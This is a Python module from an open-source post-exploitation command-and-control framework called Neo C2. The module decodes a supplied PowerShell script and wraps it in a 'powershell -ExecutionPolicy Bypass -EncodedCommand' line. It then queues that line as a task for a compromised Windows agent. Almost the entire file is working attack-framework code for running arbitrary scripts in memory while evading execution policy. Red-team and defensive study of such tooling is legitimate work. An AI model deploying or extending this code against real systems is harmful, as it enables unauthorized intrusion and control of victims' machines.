"""
The Neo C2 Framework is a post-exploitation command and control framework.

This file is part of Neo C2 Framework.
Copyright (C) 2025 @stillbigjosh

The Neo C2 Framework of this edition is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
any later version.

The Neo C2 Framework is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Neo.  If not, see <http://www.gnu.org/licenses/>
"""

import os
import importlib.util
import base64
import re

def get_info():
    return {
        "name": "pwsh",
        "description": "Execute PowerShell scripts on agents session in-memory",
        "type": "execution",
        "platform": "windows",
        "author": "NeoC2 Framework by @stillbigjosh",
        "references": [
            "https://github.com/stillbigjosh/NeoC2"
        ],
        "technique_id": "T1059",  # Command and Scripting Interpreter
        "mitre_tactics": ["Execution"],
        "options": {
            "agent_id": {
                "description": "ID of the agent to run PowerShell script on",
                "required": True
            },
            "script_path": {
                "description": "Path to the PowerShell script on client machine",
                "required": True
            },
            "arguments": {
                "description": "Arguments to pass to the PowerShell script",
                "required": False,
                "default": ""
            }
        }
    }


def execute(options, session):
    agent_id = options.get("agent_id")
    script_path = options.get("script_path")
    script_args = options.get("arguments", "")

    if not agent_id:
        return {
            "success": False,
            "error": "agent_id is required"
        }

    if not script_path:
        return {
            "success": False,
            "error": "PowerShell script path is required"
        }

    session.current_agent = agent_id

    # Check if script_path is already base64 encoded content (indicates client-side file)
    if "FILE_NOT_FOUND_ON_CLIENT" in script_path:
        # Special flag indicating the file was not found on the client side
        return {
            "success": False,
            "error": f"PowerShell script file not found on client: {script_path.replace(' FILE_NOT_FOUND_ON_CLIENT', '')}. No server-side fallback mechanism - file must exist on client."
        }
    elif _is_base64(script_path):
        # The script_path is already base64 encoded content from the client
        # Decode the base64 content to get the PowerShell script
        try:
            decoded_script = base64.b64decode(script_path).decode('utf-8')
            # Create the encoded command directly from the decoded script
            script_bytes = decoded_script.encode('utf-16le')
            encoded_cmd = base64.b64encode(script_bytes).decode('ascii')
            command = f"powershell -ExecutionPolicy Bypass -EncodedCommand {encoded_cmd}"
        except Exception as e:
            return {
                "success": False,
                "error": f"Error decoding PowerShell script: {str(e)}"
            }
    else:
        # The CLI should have already handled file lookup and sent base64 content
        # If we get here, it means the CLI didn't properly handle the file lookup
        return {
            "success": False,
            "error": f"Invalid input format. CLI should send base64 encoded PowerShell script content, but received: {script_path[:50]}..."
        }

    if script_args:
        # If there are arguments, we need to modify the command to include them
        # For PowerShell encoded commands with arguments, we need a different approach
        if _is_base64(script_path):
            # If it's already base64 encoded content, we need to re-encode with arguments
            try:
                decoded_script = base64.b64decode(script_path).decode('utf-8')
                full_script = f"& {{ {decoded_script} }} {script_args}"
                script_bytes = full_script.encode('utf-16le')
                encoded_cmd = base64.b64encode(script_bytes).decode('ascii')
                command = f"powershell -ExecutionPolicy Bypass -EncodedCommand {encoded_cmd}"
            except Exception as e:
                return {
                    "success": False,
                    "error": f"Error processing PowerShell script with arguments: {str(e)}"
                }

    if not hasattr(session, 'agent_manager') or session.agent_manager is None:
        return {
            "success": False,
            "error": "Session does not have an initialized agent_manager"
        }

    # Check if this is being executed in interactive mode
    if hasattr(session, 'is_interactive_execution') and session.is_interactive_execution:
        # Return the command that should be executed interactively
        return {
            "success": True,
            "output": f"[x] PowerShell script execution prepared for interactive mode",
            "command": command
        }
    else:
        try:
            agent_manager = session.agent_manager
            task_result = agent_manager.add_task(agent_id, command)
            if task_result.get('success'):
                task_id = task_result['task_id']
                return {
                    "success": True,
                    "output": f"[x] PowerShell script execution task {task_id} queued for agent {agent_id}",
                    "task_id": task_id,
                    "command": command
                }
            else:
                return {
                    "success": False,
                    "error": f"Failed to queue task for agent {agent_id}: {task_result.get('error', 'Unknown error')}"
                }
        except Exception as e:
            return {
                "success": False,
                "error": f"Error queuing task: {str(e)}"
            }


def _is_base64(s):
    try:
        # Check if the string contains only valid base64 characters
        if not re.match(r'^[A-Za-z0-9+/]*={0,2}$', s):
            return False

        # Pad the string if necessary for decoding
        padded = s
        padding_needed = len(s) % 4
        if padding_needed:
            padded = s + '=' * (4 - padding_needed)

        # Try to decode
        decoded = base64.b64decode(padded, validate=True)

        # Re-encode the decoded content
        re_encoded = base64.b64encode(decoded).decode('utf-8')

        # Check if the re-encoded version matches the original when both are padded the same way
        # Pad the original to 4-byte boundary for comparison
        orig_padded = s
        orig_padding_needed = len(s) % 4
        if orig_padding_needed:
            orig_padded = s + '=' * (4 - orig_padding_needed)

        return re_encoded == orig_padded
    except Exception:
        return False
